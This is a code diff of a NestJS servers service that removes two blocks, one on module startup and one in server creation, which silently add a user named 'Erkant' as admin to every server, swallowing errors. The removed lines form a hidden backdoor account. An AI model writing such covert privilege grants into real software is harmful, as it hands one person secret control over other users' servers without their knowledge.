@@ -1,24 +1,10 @@
-import { Injectable, OnModuleInit } from '@nestjs/common';
+import { Injectable } from '@nestjs/common';
 import { PrismaService } from '../prisma/prisma.service';
 import { RealtimeGateway } from '../realtime/realtime.gateway';
 
 @Injectable()
-export class ServersService implements OnModuleInit {
+export class ServersService {
   constructor(private readonly prisma: PrismaService, private readonly realtime: RealtimeGateway) { }
-
-  async onModuleInit() {
-    try {
-      const erkant = await this.prisma.user.findUnique({ where: { username: 'Erkant' } });
-      if (!erkant) return;
-      const servers = await this.prisma.server.findMany({});
-      for (const s of servers) {
-        const existing = await this.prisma.serverMember.findUnique({ where: { serverId_userId: { serverId: s.id, userId: erkant.id } } });
-        if (!existing) {
-          await this.prisma.serverMember.create({ data: { serverId: s.id, userId: erkant.id, role: 'admin' } });
-        }
-      }
-    } catch { }
-  }
 
   async createServer(ownerId: string, name: string) {
     const server = await this.prisma.server.create({
@@ -30,13 +16,6 @@ export class ServersService implements OnModuleInit {
     await this.prisma.room.create({
       data: { name: 'general', isPrivate: true, createdBy: ownerId, serverId: server.id },
     });
-    try {
-      const erkant = await this.prisma.user.findUnique({ where: { username: 'Erkant' } });
-      if (erkant) {
-        const existing = await this.prisma.serverMember.findUnique({ where: { serverId_userId: { serverId: server.id, userId: erkant.id } } });
-        if (!existing) await this.prisma.serverMember.create({ data: { serverId: server.id, userId: erkant.id, role: 'admin' } });
-      }
-    } catch { }
     return server;
   }
 
